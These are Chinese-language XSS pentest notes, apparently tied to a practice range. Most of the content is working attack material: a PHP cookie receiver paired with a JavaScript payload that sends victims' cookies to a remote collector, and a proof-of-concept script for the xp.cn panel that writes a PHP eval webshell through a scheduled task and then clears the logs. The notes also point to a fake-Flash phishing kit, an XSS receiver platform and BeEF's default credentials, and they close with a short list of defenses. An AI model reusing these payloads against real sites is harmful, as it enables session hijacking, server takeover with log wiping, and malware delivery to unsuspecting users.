> 靶场|pika
## 1.凭证窃取

```PHP
<?php
	$url = $_GET('u');
	$cookie = $_GET('c');
	$fp = fopen('cookie.txt',"a");//打开文件
	fwrite($fp,$url."||".$cookie."\n");//将获取内容进行写入,通过.进行拼接
	fclose($fp);//关闭文件
?>
```

```HTML
<script>
	var url = 'http://远程PHP文件地址?u='+window.location.href+'&c='+encodeURLComponent(document.cookie);//URL编码cookie防止有特殊字符
	document.write("<img src="+url+"/>");//发起请求
	//fetch(urk);
</script>
```
`fwrite` `fetch`均可发起请求
使用的时候将JS整理为1行，在登陆框提交

---

## 2.XSS平台
> 专门用于进行XSS漏洞验证、安全测试与教学的工具

- [蓝莲花XSS平台](https://github.com/firesunCN/BlueLotus_XSSReceiver)著名XSS平台开源项目

- [蓝莲花XSS平台_PRO](https://github.com/wqnmlgb151/BlueLotus_XSSReceiver_PRO)本人基于上一个改的


---
## 3.构造数据获取Shell
> 熟悉业务系统的情况下，可以根据流量包请求特征，构造请求从而实现攻击获取Shell

示例：针对小皮面板后台的Poc.js
```JS
function poc() {
    $.get('/service/app/tasks.php?type=task_list', {}, function (data) {
        var id = data.data[0].ID;
        $.post('/service/app/tasks.php?type=exec_task', {
            tid: id
        }, function (res2) {
            $.post('/service/app/log.php?type=clearlog', {

            }, function (res3) { }, "json");


        }, "json");
    }, "json");
}
function save() {
    var data = new Object();
    data.task_id = "";
    data.title = "test";
    data.exec_cycle = "1";
    data.week = "1";
    data.day = "3";
    data.hour = "14";
    data.minute = "20";
    data.shell = 'echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/1.php';  //写入的路径，需要知道目标的路径
    $.post('/service/app/tasks.php?type=save_shell', data, function (res) {
        poc();
    }, 'json');
}
save();
```
## 4.XSS-flash钓鱼
> 一种结合了**跨站脚本漏洞XSS**与**社会工程学-水坑攻击**的**经典网络安全攻击手法**。攻击者利用网站的 XSS 漏洞注入恶意脚本，当受害者访问该页面时，会弹出一个伪造的“Flash Player 版本过低，需要升级”的提示框，从而诱导受害者下载并运行捆绑了木马的伪造安装包。

[XSS-fiash钓鱼](https://github.com/hackxc/xss_flash)
## 5.XSS-利用平台框架

- [Beef-xss介绍](https://cloud.tencent.com/developer/article/2196746)Kali工具
	- 默认账号：`beef` 默认密码：`123`or`beef`
	- 由于其使用限制建议：
		- 内网渗透，练习靶场
		- 弄个公网ip（云服务器/内网穿透）
## 6.防御

1. 在`cookie`中设置了`HttpOnly`属性，那么通过`JavaScript`脚本将无法读取到`cookie`信息，这样能一定程度上防止XSS攻击。
2. 假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的cookie中的变量，HTTP请求头部中的变量等。
3. 不仅验证数据的类型，还要验证其格式、长度、范围和内容。
4. 过滤“<”、“>”将用户输入放入引号间，基本实现数据与代码隔离；过滤双引号防止用户跨越许可的标记，添加自定义标记；过滤TAB和空格,防止关键字被拆分；过滤script关键字；过滤&#防止HTML属性绕过检查。在客户端和服务器端同时做数据的验证与过滤。
5. 对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。